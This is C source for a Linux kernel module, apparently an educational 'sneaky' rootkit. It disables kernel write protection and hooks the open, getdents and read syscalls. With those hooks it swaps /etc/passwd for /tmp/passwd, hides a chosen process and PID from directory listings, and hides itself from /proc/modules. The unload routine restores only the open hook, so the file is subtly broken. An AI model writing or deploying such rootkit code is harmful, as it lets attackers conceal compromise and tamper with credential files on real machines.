#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
//#include <string.h>

/* declaration of linux_dirent */
struct linux_dirent {
  u64            d_ino;
  s64            d_off;
  unsigned short d_reclen;
  char           d_name[256];
  //  char           pad;       // Zero padding byte
  //char           d_type;    // File type 
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(unsigned int fd, void *data, size_t count);

#define TMP_P "/tmp/passwd"
#define ETC_P "/etc/passwd"
#define PC_M "/proc/modules"
static int proc_m_flag = 0;
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  char *tmp = TMP_P;
  char *etc = ETC_P;
  printk(KERN_INFO "Very, very Sneaky!\n");
  if(strcmp(pathname, etc)==0){
    copy_to_user((void*)pathname, tmp, strlen(tmp));
  }
  else if (strcmp(pathname, PC_M)==0){
    proc_m_flag = 1;
  }
  return original_call(pathname, flags);
}

#define MOD "sneaky_mod"
asmlinkage ssize_t sneaky_sys_read(unsigned int fd, void *data, size_t count){
  ssize_t bytes_read = original_read(fd, data, count);
  char *sneaky_p = strstr(data, MOD);
  if(sneaky_p != NULL){
    char *sneaky_end = strchr(sneaky_p, '\n');
    if(sneaky_p != NULL){	
      if(proc_m_flag == 1){
	memmove(sneaky_p, sneaky_end+1, bytes_read - (sneaky_end + 1 - sneaky_p));
	bytes_read -= sneaky_end + 1 - sneaky_p;
	proc_m_flag = 0;
      }
    }
  } 
  return bytes_read;
}

static char* sn_pid = "1234";
module_param(sn_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); 
MODULE_PARM_DESC(sn_pid, "sneaky process pid");
#define SNK_P "sneaky_process"
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  int bytes_read;
  struct linux_dirent *d = dirp;
  int i;
  printk(KERN_INFO "enter sneaky_sys_getdents()!!!\n");
  bytes_read = original_getdents(fd,dirp,count);
  
  for (i = 0; i < bytes_read; i += d->d_reclen) {
    d = (struct linux_dirent *)((char *)dirp + i);
    //hide sneaky_process
    if ((strcmp(d->d_name, SNK_P) == 0) || (strcmp(d->d_name, sn_pid)==0)){
      memmove(d, (char*)d + d->d_reclen, bytes_read - i - d->d_reclen);
      bytes_read -= (int)d->d_reclen;
      break;
    }
    //hide /proc/pid
    /*
    if (strcmp(d->d_name, sn_pid) == 0){
      printk(KERN_INFO "pid hid\n");
      memmove(d, (char*)d + d->d_reclen, bytes_read - i - d->d_reclen);
      bytes_read -= (int)d->d_reclen;
      break;
      }*/
  }
  return bytes_read;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  
  original_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  /*
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  */
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

